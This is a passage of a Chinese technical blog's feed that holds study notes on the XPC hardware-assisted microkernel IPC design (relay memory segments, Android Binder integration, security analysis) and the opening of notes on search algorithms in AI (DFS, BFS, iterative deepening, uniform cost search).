stack，虽然说 <code>xcall</code> 完成了一次简单的 context switch，但毕竟只改了 Page Table、TLB、PC，还有进程很多其他信息像文件描述符表、CPU 寄存器等信息没有恢复，也没保存在 link stack 中。</p><blockquote><p>有些 per-thread 的 寄存器（例如 <code>xcall-cap-reg</code>）会在 <code>xcall</code> 的时候交给硬件修改；</p></blockquote><p>这是因为 XPC engine 想把这部分恢复工作交给 XPC 库/应用来放到 user space 来做。对不同架构，如果有些信息在 user space 恢复不了，还可以扩展这个表，让它满足其他架构的 switch 需求。这就是前面提到的 caller 调用 callee 中 “共同约定管理 context 能优化掉 Kernel 参与 switch 的过程”。</p><p>这里还有一个严重的问题。在 <code>xcall</code> 从 caller 向 callee 切换的时候，可能在期间发生一次 page fault 中断进入 Kernel，因为 Kernel 对这个过程无感知，所以可能会用 caller 的 page table / VMA 等信息来处理 callee 的 page fault。解决方案借鉴了 migrating thread，将由 kernel 管理的线程状态划分为两类：</p><ul><li>scheduling states：关于内核调度的信息，包括 kernel stack、优先级、time slice；</li><li>runtime states：内核用来服务这个线程的信息，例如地址空间（VM 分配）、capabilities 等等；</li></ul><p>这里可以让 <code>xcall-cap-reg</code> 作为一个 runtime states 让 kernel 区分；当 trap 到 kernel 时，让 kernel 通过 <code>xcall-cap-reg</code> 找到当前线程的 runtime-states，从而解决问题；</p><p>笔者还提到 <code>xcall</code> 向 link stack（每个线程中，位于主存）写数据时有时延，可以采用非阻塞式地异步写，可以优化 16 cycles；</p><p>笔者表示，除了写 link stack 会有较高的延迟，需要优化以外，第二步从 <code>x-entry-table</code> 中取 entry 也耗时所以单独给这个表做缓存。不过基于两个事实：</p><ul><li>IPC 的时间局部性很强；</li><li>IPC 是可预测的；</li></ul><p>笔者提出使用软件层面的 cache，预测要进行的 IPC 并把需要的 entry 先 prefetch 一下，又能提升 12 cycles；</p><h3 id="关于-Relay-Memory-Segment"><a href="#关于-Relay-Memory-Segment" class="headerlink" title="关于 Relay Memory Segment"></a>关于 Relay Memory Segment</h3><p><img src="imgs/seg-mask.png" /></p><ul><li><p><code>seg-reg</code> 的地位：我们知道，relay memory segment 已经脱离 page table 的管理，相当于用 <code>seg-reg</code> 做了一个独立、持久的 TLB；不过在地址翻译过程中，<code>seg-reg</code> 的优先级高于 TLB；</p></li><li><p><code>seg-mask</code> 寄存器规定的新功能：目前 <code>seg-reg</code> 指定了 relay memory segment 的全部范围，但实际上在某些场景下，我们只希望传递其中一片区域的信息，但 user space 的 app 是不能改 <code>seg-reg</code> 寄存器的，所以可以使用 <code>seg-mask</code> 来规定范围：</p><p>这样在 <code>xcall</code> 填入 link stack 时，把原来的 <code>seg-reg</code> 和 <code>seg-mask</code> 信息保存下，再把 <code>seg-reg</code> 和  <code>seg-mask</code> 的交集更新到 <code>seg-reg</code> 中。这样后面的 calling chain 就只能看到这片内存；</p></li><li><p><code>seg-list</code> 支持服务端创建多个 relay memory segment 区域：每个进程管理一个 <code>seg-list</code>，其基地址使用 <code>seg-list-reg</code> 存放（<code>seg-list</code> 和 <code>seg-list-reg</code> 都由 OS Kernel 管理）；执行 <code>swapseg #reg</code> 即可切换到 <code>#reg</code> 索引的 entry 中（atomic），更新新的 <code>seg-reg</code>；</p></li></ul><p>回顾一下之前遇到的问题，relay memory segment 如何更改区域的 ownership？</p><p>实际上，OS Kernel 会确保<strong>每片 relay memory segment 只会被一个 CPU core 访问</strong>（也就是说同一时间只会有一个线程拥有访问这个区域的能力），并且所有权会随着 calling chain 传递，解决 ownership 转移、减小 TOCTTOU 风险的同时，避免直接修改页表导致 TLB 击穿。</p><p>还有在 <code>xret</code> 时重要的安全逻辑：返回前检查 callee 本身的 <code>seg-reg</code> 和调用时的状态是一致的（<strong>通过检查 link stack 上的 <code>seg-reg &amp; seg-mask</code> 与当前 <code>seg-reg</code> 指定范围是否匹配</strong>），如果不一致，则说明有恶意的 callee 把不恢复原先的 <code>seg-reg</code>，而是 swap 到 <code>seg-list</code> 中。如果 check 失败，则会向 Kernel 抛出异常。</p><blockquote><p>总结一下每个表现在所处的位置：</p><ul><li><code>x-entry-table</code>：全局内存（Kernel space）；</li><li><code>xcall-cap-bitmap</code>：per-thread memory，被 Kernel 管理，由 <code>xcall-cap-reg</code> 指向；</li><li><code>link-stack</code>：per-thread memory，只被 Kernel 访问，由 <code>link-reg</code> 指向；</li><li><code>relay-segment-list</code>：per-process memory，被 Kernel 管理，由 <code>seg-list-reg</code> 指向；</li><li>relay memory segment: continuous physical memory，可被服务端创建多个，由 <code>seg-reg</code> / <code>seg-list-entry</code> 指向；</li><li><code>seg-reg</code> 寄存器：同时有虚拟地址和物理地址，随着 calling chain 传递，每个线程自己可以通过修改 <code>seg-mask</code> 来改变传给 callee 的内存范围；</li></ul><p>前 4 个就是 Kernel 帮忙管理，后一个需要 Kernel 帮忙 check no overlap；</p><p>中途在出现 context switch 时，会 save/restore <strong>per-thread</strong> objects；</p><p>思考：各个寄存器放的是物理地址还是虚拟地址？</p></blockquote><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="RocketChip-Microkernel"><a href="#RocketChip-Microkernel" class="headerlink" title="RocketChip (Microkernel)"></a>RocketChip (Microkernel)</h3><ul><li>XPC Engine -&gt; a unit of a RocketChip core;</li><li>新寄存器 -&gt; <code>CSRs</code>（Control &amp; Status Registers），通过 <code>csrr / csrw</code> 指令访问；</li><li>新指令 <code>xcall / xret / swapseg</code> 会在 Execution Stage 向 XPC Engine 发送（不涉及内核）；</li><li>新增 5 类 exceptions；</li><li>默认实现不含  x-entry-table 的 cache，为了最小化硬件改动；如果改动，则使用 1 entry 作为缓存，使用软件管理，在 prefetch 时调用 <code>xcall -#reg</code>；</li></ul><p>权限转移（Capability）：XPC 这套架构提供一套 “赋予能力” 的功能，这个就是 <code>grant-cap</code>；这个功能也由 Kernel 管理。一个线程创建 <code>x-entry</code> 时就拥有对这个 <code>x-entry</code> 的 <code>xcall-cap</code> 以及赋予这个能力的 <code>grant-cap</code>，现在这个线程可以给指定线程赋予 <code>xcall-cap</code> 的能力；</p><p>单次调用 C-Stack: XPC 支持一个 server 的 <code>x-entry</code> 同时被多个 clients invoke；XPC library 会提供一种 per-invocation XPC context，其中包括了一个 execution stack 和 local data，用来支持多个 clients 同时进行跨进程调用；</p><p>每创建一个 <code>x-entry</code> 就能针对这个 entry 设定最大的 context 数，XPC library 会提前创建这些 context 并向 <code>x-entry</code> 绑定一个 “跳板”；当 clients invoke 这个 <code>x-entry</code> 后，XPC library 就按此跳板恢复 C-stack 以及 local data，并在 return 前释放资源；如果没有空闲的 context，则抛出错误或者等待空闲的 context 出现；</p><blockquote><p>也可能出现 Dos 攻击，假设一个恶意的 client 频繁 invoke 某个 <code>x-entry</code>，耗尽了这个 entry 的 context。</p><p>对于这个问题，XPC 允许 server 指定策略限制 clients 访问 entry，又或者引入信用系统；</p></blockquote><p>调用链的异常终止与断开策略：假设 xcall 的调用链 A -&gt; B -&gt; C 中，B 因为某些原因被 Kernel kill 了；如果此时 C xret 了，则可能返回到错误的进程。为了解决这种情况，在调用链中途的进程被 kill 后需要引发一个 exception 让 Kernel 处理。</p><p>解决方法是，在一个进程结束后，让 Kernel 扫描一遍 link stack，找到死去的进程并将 valid 位置为 0，这样在 C xret 时校验 valid 会发现问题并抛出 exception，Kernel 就可以将无效的 stack entry pop 出去，程序控制流能够返回 A 进程中；</p><p>另一种减少 scan table 的方式是，在 B 死去后，直接将 top level page table 清零，这样在 C xret 时会触发 page fault，Kernel 会介入并回收 B 的资源（为什么？参见 “<code>seg-reg</code> handover” 的讨论）；</p><h3 id="Android-Binder"><a href="#Android-Binder" class="headerlink" title="Android Binder"></a>Android Binder</h3><p>Android Binder: driver + framework (C++ middleware) + API (Android interface definition language)</p><ul><li><p>binder transaction -&gt; cross-process method invoke; </p></li><li><p>twofold-copy &amp; transaction buffer -&gt; transfer data;</p><p>anonymous shared memory (ashmem) -&gt; bulk memory transfer;</p></li></ul><p>其中，原先的 binder transaction 过程如下：</p><ol><li>client 准备 method code（代表 remote method），在调用时携带集中好的数据（Android 中的 parcels）；</li><li>client binder 对象调用 <code>transact()</code>，通过 AB driver 复制 user space 中的 transaction buffer 到 kernel 中（<code>copy_from_user</code>），再切到 server side 从 kernel 中复制出来（<code>copy_to_user</code>）（两次复制，两次 domain switch，称 twofold copy）；</li><li>Binder Framework 的 server side 收到请求并触发预先准备的 <code>onTransact()</code>；</li><li>最终控制流回到 server，server 可以通过 AB driver 回复；</li></ol><p>XPC 对此的优化方式是：</p><ul><li>不修改 IPC interfaces（<code>transact/onTransact</code>）确保应用兼容性；</li><li>extend binder driver 来定义管理 <code>xcall-cap</code> 和 <code>x-entry table</code> 的能力；</li><li>当应用调用 binder interface 的 <code>addService</code> 注册服务时，修改后的 framework 会向 binder driver 触发 <code>ioctl</code> 指令来添加一个 <code>x-entry</code>；</li><li>对于使用 <code>getService</code> 准备调用对应服务的 client 而言，framework 会 <code>set-xcap</code> 来保证 client 有权访问对应的 <code>x-entry</code>；</li><li>上面都是准备工作。在 client 真正调用 remote method 的时候，<strong>使用 <code>xcall / xret</code> 指令，并且用 relay memory segment 实现 parcels 来完成 data transfer</strong>。期间注意 kernel 还是需要管理 per-thread XPC registers；</li></ul><p>这样期间的 domain switch 以及 memory copying 都被消除了；</p><p>此外，Android 的 anonymous shared memory 子系统向 user space 提供一套基于文件共享内存的接口。虽然类似匿名内存，但是借助共享 file descriptor 来向其他进程共享映射方案的。进程既可以使用 mmap 也可以用 file I/O；</p><p>和其他 share memory 来在进程间共享内存的方法一样，ashmem 需要多进行一次额外的 copy 来规避 TOCTTOU 风险，这会造成性能损失。于是 XPC 优化如下：</p><ul><li>ashmem 分配：更改 framework 在分配 ashmem 时用 driver 分配一段 relay memory segment；</li><li>ashmem 映射：map 动作会将位于物理内存上的 relay memory segment 分配到虚拟内存上，设置 <code>seg-reg</code> 寄存器；</li><li>ashmem 所有权转移：仅通过 framework 调用 xcall 是传递 <code>seg-reg</code> 来完成；</li></ul><p>不过一般情况下同一时间只有一个活跃的 relay memory segment。如果一个应用需要同时访问多个 relay memory segment，可以借助 page fault（隐式）或 使用 <code>swapseg</code>（显式）切换 relay memory segment；</p><h3 id="seg-reg-handover"><a href="#seg-reg-handover" class="headerlink" title="seg-reg handover"></a><code>seg-reg</code> handover</h3><p>在 calling chain 传递 <code>seg-reg</code> 想法是好的，但实际上还会遇到一些问题：</p><ul><li>如果需要一部分一部分传递 relay memory segment 的内容，应该怎么办？</li><li>我们在上面讨论 “调用链异常终止” 的情况时，只是采取措施不至于返回到错误的进程，但死去的进程的资源（例如它所创建的所有 relay segment memory，还不能被其他 relay memory 或页表使用）。应该在什么时机释放它们？</li><li>传递过程中可能出现追加信息的情况（例如网络栈会追加头部包数据），如果这个时候超过 relay memory segment 大小怎么办？</li></ul><p>第一个问题很简单，就利用 <code>seg-mask</code> 像滑动窗口一样向 callee 传递其中一段内存即可；</p><p>第二个问题，在触发异常进入 Kernel 后，Kernel 除了 pop invalid link stack entry 或者将 dead process 的首级页表清零以外，还可以扫描 <code>seg-list</code>，恢复 caller 原来的 relay segment，同时释放掉这个进程分配的其他 relay segments；</p><p>第三个问题，需要 Message Size Negotiation；如果存在一个调用链 <code>A -&gt; B -&gt; [C | D]</code>（B 可能调用 C 也可能调用 D），那么：</p><script type="math/tex; mode=display">S_{\text{all}}(A)=S(\text{msg})+S_{\text{all}}(B)=S(\text{msg})+S_{\text{self}}(B)+\max\{S_{\text{all}}(C)+S_{\text{all}}(D)\}</script><p>其中 $S_{\text{all}}(X)$ 表示 $X$ 需要的所有空间，$S_{\text{self}}(X)$ 表示 $X$ 在自己的 logic 中需要追加的内容所占空间；</p><h2 id="测试评估"><a href="#测试评估" class="headerlink" title="测试评估"></a>测试评估</h2><p>优化对比：</p><ul><li>partial context</li><li>tagged TLB</li><li>Nonblock link stack（write）</li><li>XPC Engine cache（1 entry prefetch）</li></ul><h3 id="Microbenchmark"><a href="#Microbenchmark" class="headerlink" title="Microbenchmark"></a>Microbenchmark</h3><ul><li>One-way call</li><li>Multi-core IPC：因为采用了 migrating thread model，跨核调用的性能并没有明显下降；</li></ul><h3 id="OS-Services"><a href="#OS-Services" class="headerlink" title="OS Services"></a>OS Services</h3><ul><li>file system</li><li>network</li></ul><h3 id="Android-Binder-1"><a href="#Android-Binder-1" class="headerlink" title="Android Binder"></a>Android Binder</h3><p>limitations: 仅支持同步 IPC（异步 IPC 像 death notification 还尚未实现），并且没有实现 split thread state 来应对 Kernel 的 trap，而是充分利用在 RISC-V 中的 “machine mode” 来捕获 xcall 和 xret 期间发生的异常。</p><blockquote><p>MACHINE MODE ？</p><p>Machine Mode (M-mode) in RISC-V is the highest privilege level in the architecture, primarily used for low-level system control and management. Here are some key points about M-mode:</p><ol><li><strong>Privilege Level</strong>: M-mode has full access to all resources and can execute any instruction without restrictions. It is designed for the operating system kernel and hardware abstraction layers.</li><li><strong>Bootstrapping</strong>: When a RISC-V system powers on or resets, it starts execution in M-mode. This allows it to initialize hardware components and set up lower privilege modes (User Mode and Supervisor Mode).</li><li><strong>Control Registers</strong>: M-mode can configure and control various system registers and hardware features, such as interrupts, timers, and memory management.</li><li><strong>Exception Handling</strong>: M-mode is responsible for handling exceptions and interrupts. When a higher privilege level (e.g., Supervisor Mode) generates an exception, control can be transferred to M-mode for processing.</li><li><strong>Delegation</strong>: M-mode can delegate certain exceptions and interrupts to Supervisor Mode, allowing for a structured and layered approach to handling system events.</li><li><strong>Memory Protection</strong>: M-mode can configure the memory protection settings for lower privilege levels, ensuring safe execution of applications.</li></ol><p>Overall, M-mode provides the foundational control necessary for managing the RISC-V system, enabling the efficient execution of higher-level software components.</p></blockquote><h2 id="硬件开销优化"><a href="#硬件开销优化" class="headerlink" title="硬件开销优化"></a>硬件开销优化</h2><p>资源 utilization 可以进一步优化，例如使用 Verilog 替代 RocketChip 中的 Chisel；</p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h3 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h3><p><strong>XPC 认证和识别</strong>：</p><p>一个 caller 如果没有对应的 <code>xcall-cap</code>，则不能直接通过 <code>xcall ID</code> 来触发一次 XPC；这个 <code>xcall-cap</code> 一般是需要向注册服务的 server（具有对应的 <code>grant-cap</code> 能力）申请，类似 08 年的一篇文章介绍的 CuriOS 中 name server 一样；</p><p>其次，一个 callee 可以通过 <code>xcall-cap-reg</code> 指向的 bitmap 来确定 caller 的身份，而这个寄存器在 <code>xcall</code> 时会被 XPC Engine 放在 general purpose register（RISC-V 中是 <code>t0</code>）中，无法被伪造。</p><p><strong>针对 TOCTTOU 的防护</strong>：</p><p>XPC 机制中，一个 relay segment 可以通过 <code>reg-seg</code> 在进程进程间传递，同一时刻最多只有一个线程拥有这片空间。并且 Kernel 会保证不会有与 page table 规定区域 overlap 的情况出现。</p><p><strong>调用链故障隔离</strong>：</p><p>在 XPC 调用链 <code>A -&gt; B -&gt; C</code> 上，任意一个进程 crash 后，总是能回到上级 caller 中继续执行。这主要是 XPC Engine 定义的机制：某进程死亡后 Kernel 会扫描一遍 link stack entry，invalid 掉无效的 process（或者进行 top level page table 清零的操作），在 <code>xret</code> 触发 exception 时再 pop 掉；同时扫描 <code>seg-list</code> 释放归属于无效进程的空间、恢复原先 caller 的 <code>seg-reg</code>、relay segment list 等等。</p><blockquote><p>注意：不能在进程刚结束就释放 relay segment lists，而是在调用链返回出错时才释放。因为我们需要死亡进程在调用时的 <code>seg-reg</code> 数据，以通过 xret 的检验。</p></blockquote><p>除此以外，XPC 还可以支持超时机制，但是实际使用时经常设置为 0 或者 $+\infty$，经常会出现没有用的情况。</p><p><strong>DoS Attacks 防御</strong>：</p><p>一种 DoS Attacks 的方式是，请求创建大量的 relay-segment，占用连续的物理内存空间，造成比较多的 external fragments；但 XPC Engine 会把 relay-seg 放在 process 的 private address space 上，因此这样本身既不会影响 Kernel 也不会影响其他进程；</p><blockquote><p>PRIVATE ADDRESS SPACE ？</p><p>因为在创建 relay segment 的时候选取的是连续的物理地址，类似 Android Binder Ashmem 创建和映射的过程，会把这个物理地址映射到当前进程的私有地址空间，然后再更改 <code>seg-reg</code> / 推入 <code>seg-list</code>，因此说使用的是 process 的private address space；</p></blockquote><p>另一种 DoS Attacks 的方式是，频繁调用 callee，消耗 x-entry 对应的 pre-invocation C-Stack（context &amp; data）；这个通过 credit system 解决，callee 可以在接受调用前检查 caller 的信用分，如果过低就不分配 XPC context 给它；</p><p><strong>Timing Attacks 防御</strong>：</p><p>首先 XPC Engine cache 比较少，发生的可能性小；其次可以像 tagged-TLB 一样，通过 tag cache entry 实现 thread-private 的形式阻隔一个线程感知其他线程的 cache，进一步减小 timing attack 的可能。</p><h3 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h3><ul><li>scalable <code>xcall-cap</code>：将 bitmap 换成 radix tree，但是会增大内存开销，使得 IPC 性能下降；</li><li>Relay Page Table：提高 relay segment 的空间利用率，可以把 segment 换成类似二层页表的结构，但是 ownership transfer 就比较难做，而且只支持以一页为粒度的内存控制；</li></ul><h2 id="其他相关工作"><a href="#其他相关工作" class="headerlink" title="其他相关工作"></a>其他相关工作</h2><p>We revisit previous IPC optimizations in this section.</p><h3 id="Domain-Switch"><a href="#Domain-Switch" class="headerlink" title="Domain Switch"></a>Domain Switch</h3><ul><li>protected procedure call (LRPC) / migrating thread（software，<strong>trap</strong>）</li></ul><p><img src="imgs/migrating-thread.png" /></p><p><img src="imgs/ppc.png" /></p><p>​    这种方法的好处是什么？</p><p>​    <strong>Eliminates the scheduling latency and mitigates IPC logic overhead !</strong></p><ul><li><p>CODOMs、CHERI（hardware）：</p><p>The switch can be done directly at unprivileged level without trapping to the kernel, which is a huge advantage against software optimizations. Meanwhile, multiple domains can share one address space (<strong>single address space</strong>), which can further reduce the overhead of TLB miss after domain switch. However, these systems usually require non-trivial changes to existing micro-kernels which are designed for address space based isolation mechanism.</p><p>（不仅硬件上需要大改，软件上也不支持现有的基于内存地址空间隔离的 micro-kernels）；</p></li></ul><h3 id="Message-Copying"><a href="#Message-Copying" class="headerlink" title="Message Copying"></a>Message Copying</h3><ul><li><p>LRPC（software）：reduce twofold copy（caller -&gt; kernel -&gt; callee） to one（caller -&gt; shared memory）；</p><p>TOCTTOU 发生机制：在 callee 检查完成 shared memory 中的 messsage 有效性和安全性之后准备执行时，caller 通过精巧的时间掌控（例如利用 trap）在期间更改了 shared memory 的内容为恶意数据或代码；</p><p>但是如果再从 shared memory 中 copy 一次，那就丧失了节省一次 copy 的优势了；</p></li><li><p>remapping page ownership（software）: kernel involved &amp; TLB shootdown；</p><p>而且 remapping page 粒度在 page 级别，很难在 calling chain 中 handover（对 shared memory 也是）；</p></li><li><p>temporary mapping（software）：kernel 找到 callee 中 unmapping area，把它和 caller 的 communication window（一种位于 caller address space 中，但只能被 Kernel 访问的空间）map 到一起；当 caller 向 Kernel 请求发送把消息 copy 到 communication window 并 send 之后，caller 本身是无法继续访问这块空间，杜绝了 TOCTTOU 的风险，但是：1 次 copy、remapping + TLB shootdown、kernel involved 仍然会带来不可忽略的开销；</p></li><li><p>CODOMs（hardware）：hybrid memory granting mechanism（permission list + capability registers），但是同样存在 ownership 的问题（哪个线程有这个寄存器的值就能访问）。不过由于使用 single address space，因此 tagged memory 来实现隔离，并且能降低 TLB shootdown 带来的开销；</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是一篇 2019 年的关于微内核 IPC 性能优化的文章。&lt;/p&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;微内核有很多引人注目的 features，例如 安全性、容错性、</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="OS" scheme="https://blog.sjtuxhw.top/tags/OS/"/>
    
    <category term="IPC" scheme="https://blog.sjtuxhw.top/tags/IPC/"/>
    
    <category term="MicroKernel" scheme="https://blog.sjtuxhw.top/tags/MicroKernel/"/>
    
  </entry>
  
  <entry>
    <title>Algorithms in AI</title>
    <link href="https://blog.sjtuxhw.top/technical/algo-in-ai/"/>
    <id>https://blog.sjtuxhw.top/technical/algo-in-ai/</id>
    <published>2024-07-20T07:23:40.000Z</published>
    <updated>2024-10-25T13:53:07.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-Intro"><a href="#Chapter-0-Intro" class="headerlink" title="Chapter 0. Intro"></a>Chapter 0. Intro</h1><h2 id="0-1-The-definition-of-Artificial-Intelligence"><a href="#0-1-The-definition-of-Artificial-Intelligence" class="headerlink" title="0.1 The definition of Artificial Intelligence"></a>0.1 The definition of Artificial Intelligence</h2><ul><li><p>Think rationally -&gt; Think like people -&gt; Act like people -&gt; <strong>Act rationally</strong>.</p><blockquote><p>The system <strong>maximumly achieving predefined goals</strong>.</p><p>-&gt; <strong>Maximize the expected utility.</strong> (最大化预期效用)</p></blockquote></li><li><p>Brains and AI</p><ul><li><p>Why not reverse engineering the brains? -&gt; Not as modular as software.</p></li><li><p>But there are the lessons <strong>learned from the brain</strong> (interleave, 交织在一起):</p><ul><li><p><strong>Memory (data): Judge situations depending on the previous experiences (statistics)</strong>.</p><blockquote><p>e.g., Bayes’ nets, Decision theory, <strong>Machine learning</strong>,…</p></blockquote></li><li><p><strong>Simulation (computation): Predict the future depending on the models</strong>.</p><blockquote><p>e.g., Search, Satisfying constraints, Adversarial and uncertain search,… (<strong>Algorithms</strong>)</p></blockquote></li></ul></li></ul></li></ul><h2 id="0-2-The-History-of-AI"><a href="#0-2-The-History-of-AI" class="headerlink" title="0.2 The History of AI"></a>0.2 The History of AI</h2><h2 id="0-3-The-Applications-of-AI"><a href="#0-3-The-Applications-of-AI" class="headerlink" title="0.3 The Applications of AI"></a>0.3 The Applications of AI</h2><ul><li><strong>Natural language</strong>: speech technology (+context), language processing technologies (Q&amp;A / translation / web search …);</li><li><p><strong>Computer vision</strong> (perception)</p></li><li><p><strong>Game playing</strong>;</p></li><li><strong>Logic</strong>: Theorems provers, NASA fault diagnosis, …</li></ul><h2 id="0-4-Designing-Rational-Agents"><a href="#0-4-Designing-Rational-Agents" class="headerlink" title="0.4 Designing Rational Agents"></a>0.4 Designing Rational Agents</h2><ul><li>Agent: An agent is an entity that perceives and acts.</li><li><strong>Environment -&gt; sensors of an agent -&gt; agent functions -&gt; actuators -&gt; effect on environment</strong>.</li></ul><h1 id="Chapter-1-Search"><a href="#Chapter-1-Search" class="headerlink" title="Chapter 1. Search"></a>Chapter 1. Search</h1><blockquote><p>Discuss agents that <strong>plan ahead</strong> rather than just react to a current situation.</p><p><strong>将现实问题 formalize 为数学问题，并使用算法模拟搜索求解</strong>。</p></blockquote><h2 id="1-1-Reflex-Agents"><a href="#1-1-Reflex-Agents" class="headerlink" title="1.1 Reflex Agents"></a>1.1 Reflex Agents</h2><ul><li><p>They have a current percept, <strong>and maybe make decision based on these memory but <u>without consideration of the consequences of their actions</u>.</strong></p><blockquote><p>仅根据当前状态，直接进行当前最优动作；</p><p>例如，根据当前 successor 的结果谁更接近 goal 就进行什么操作。</p></blockquote></li><li><p>类似贪心算法，有时 rational，但有时并不是；</p></li></ul><h2 id="1-2-Planing-Agents"><a href="#1-2-Planing-Agents" class="headerlink" title="1.2 Planing Agents"></a>1.2 Planing Agents</h2><ul><li><p>They have the model of what the world works, and the goals. <strong>根据一系列动作，结合模型假设后果，并根据后果和目标的关系来决定是否进行这个操作</strong>。</p><blockquote><p>实现 1 (master-mind)：先遍历查找动作序列，再行动（时间花费很大）；</p><p>实现 2 (re-planning)：先遍历最近的动作序列，行动，然后再遍历下一段的动作序列，再行动，以此往复（类似结合了贪心法的动态规划）；</p></blockquote></li><li><p>Optimal Planning（最优计划） &amp; Complete Planning（能解决问题的存在性计划）</p></li></ul><h2 id="1-3-Search-Problem（Uninformed-Search）"><a href="#1-3-Search-Problem（Uninformed-Search）" class="headerlink" title="1.3 Search Problem（Uninformed Search）"></a>1.3 Search Problem（Uninformed Search）</h2><h3 id="1-3-1-Definitions"><a href="#1-3-1-Definitions" class="headerlink" title="1.3.1 Definitions"></a>1.3.1 Definitions</h3><blockquote><p>什么是计算机中的搜索问题？</p></blockquote><ul><li><p>一个搜索问题包含：</p><ul><li><p>状态空间（a state space，存放环境信息）；</p></li><li><p>后继函数（a successor function，包含动作、动作开销）；</p><blockquote><p><strong>有哪些可行的动作？动作执行后的结果状态如何？——这个函数编码了 “how the world works”</strong></p></blockquote></li><li><p>初始状态（a start state）和目标检查（a goal test）；</p></li></ul></li><li><p>搜索问题的解：<strong>就是一个从初始状态到目标状态的动作序列（a sequence of actions / a plan）</strong>.</p></li></ul><blockquote><p><strong>以上可以称为搜索问题的模板，可以看作接口（interface）</strong>，这意味着我们可以将现实生活中的问题抽象到上面的模板中（casting to search problem），再对照模板设计算法，就能解决实际问题。</p></blockquote><h3 id="1-3-2-Examples"><a href="#1-3-2-Examples" class="headerlink" title="1.3.2 Examples"></a>1.3.2 Examples</h3><blockquote><p>搜索问题本质上是一个模型。举例：</p></blockquote><ul><li>城市导航路线图<ul><li>state space: cities;</li><li>successor function: roads (go to adjacent cities with <strong>cost (可以是距离、交通情况等)</strong>);</li><li>start state: 位于起点的状态；</li><li>goal test: <strong>当前状态是否是位于终点的状态</strong>；</li><li>solution: 有向路径；</li></ul></li><li>pac-man 游戏（目标是走到指定位置）<ul><li>state space: (x, y) 实体的位置信息；action: NSEW；successor function: <strong>update location only</strong>；goal test: 是否有 (x,y)==DESTINATION；</li></ul></li><li>pac-man 游戏（目标是吃完所有豆子）<ul><li>state space: (x, y) 位置 + 是否有食物的布尔值；action: NSEW；successor function: <strong>更新位置和食物情况</strong>；goal test: 是否有所有食物布尔值都为 false；</li></ul></li></ul><h3 id="1-3-3-Mathematical-amp-Algorithmic-Representation"><a href="#1-3-3-Mathematical-amp-Algorithmic-Representation" class="headerlink" title="1.3.3 Mathematical &amp; Algorithmic Representation"></a>1.3.3 Mathematical &amp; Algorithmic Representation</h3><ul><li><p><strong>搜索问题的数学表示：状态图和搜索树</strong>（state space graphs &amp; search tree）</p><ul><li><strong>它们一般过于庞大，画不出来，只需要有这样的概念就行</strong>；</li><li>搜索树结点数一般远大于状态图，因为<strong>搜索树中可以有多个结点代表同一个状态</strong>；</li></ul></li><li><p>搜索树（General Tree Search）解决 <strong>等权 / 非等权搜索问题</strong></p><blockquote><p>本部分就是数据结构中图的相关算法。涉及解决<strong>等权图最短路</strong>、<strong>非等正权图最短路</strong>等问题的经典算法。但<strong>有所不同，因为是 Tree Search，所以不会记录 visited 结点——意味着会重复搜索（具体会在 1.5 中进行阐释和改进）</strong>；</p></blockquote><ul><li><p>Important Ideas:</p><ul><li><strong>Fringe (原义条纹 / 边缘，这里指的是 a set of leaf nodes that are waiting to be expanded，通常是存放等待处理的数据结点的结构，可以是栈、队列等)</strong>;</li><li>Expansion (查找过程中再向树中插入合法结点);</li><li>Exploration strategy (<strong>DFS / BFS / Uniform Cost Search</strong>)</li></ul></li><li><p>Pseudo Code:</p><p><img src="imgs/tree_search_pseudo_code.png"></p></li></ul></li><li><p>Search Algorithm Properties of General Tree Search（<strong>针对所有 “利用搜索树” 解决搜索问题的算法</strong>）</p><ul><li><p><strong>如果 expansion strategy 算法是 DFS</strong>：</p><ul><li>实现方式：<strong>栈</strong>；</li><li>时间复杂度为 $O(b^m)$，b 为每个结点的后继结点数量级，m 为搜索树中最大深度的数量级；空间复杂度为 $O(b\cdot m)$；</li><li><strong>算法是 complete 的（如果对于无限树，且存在解，则能够找到至少一个解）</strong>；</li><li><strong>算法不是 optimal 的（DFS 无法自动找到最优解，除非你一直找，再手动比较）</strong>；</li></ul></li><li><p><strong>如果算法是 BFS</strong>：</p><ul><li>实现方式：<strong>队列</strong>；</li><li>时间复杂度为 $O(b^s)$，b 为每个结点的后继结点数量级，s 为搜索到最近的 goal state 所在层数的数量级；空间复杂度也是 $O(b^s)$;</li><li><strong>算法是 complete 的</strong>（不遍历结束、得出结果，则不会退出）；</li><li><strong>如果 cost 是相等的——即等权图，则算法是 optimal 的，因为按照层级（tier）从近处向远处找</strong>；</li></ul></li><li><p>综合上面特点发现，DFS 空间性能更好，但 BFS 能够找到等权情况下的最短路；<strong>那么我们有没有一种算法综合它们的优点呢？有的！它就是 Iterative Deepening</strong>；</p><blockquote><p><strong>Iterative Deepening（迭代深搜）</strong>利用了 DFS 空间优势。在搜索开始后，先执行 DFS，<strong>以 depth=1 和 goal 为终止条件</strong>，如果找到，就结束；否则证明 depth=1 的深度无解，将 depth 结束条件放宽至 depth=2，继续 DFS，以此类推。</p><p>这就将 DFS 和 BFS 的优势结合了起来。</p><p>不用担心每次都把前几层重复检查，因为理论上搜索树每层结点指数增长，下一层结点数往往远大于前几层结点数之和，所以重复检查的部分微不足道。</p></blockquote></li><li><p>Uniform Cost Search（UCS，一致代价搜索） 解决 <strong>Cost-sensitive Search（非等权搜索问题）</strong></p><ul><li>实现方式：<strong>优先级队列</strong>；</li><li>时间复杂度 $O(b^{C^*/\varepsilon})$，b 为每个结点后继结点数量级，C* 为解的 cost 数量级，ε 为各个结点间（每一步）的最小 cost 数量级；空间复杂度与时间相同； </li><li>此算法借鉴了 BFS 的思路，在 expansion 的时候选取 cost 最小的；</li><li><strong>算法在<u>最小权为正数</u>的情况下是 complete 和 optimal 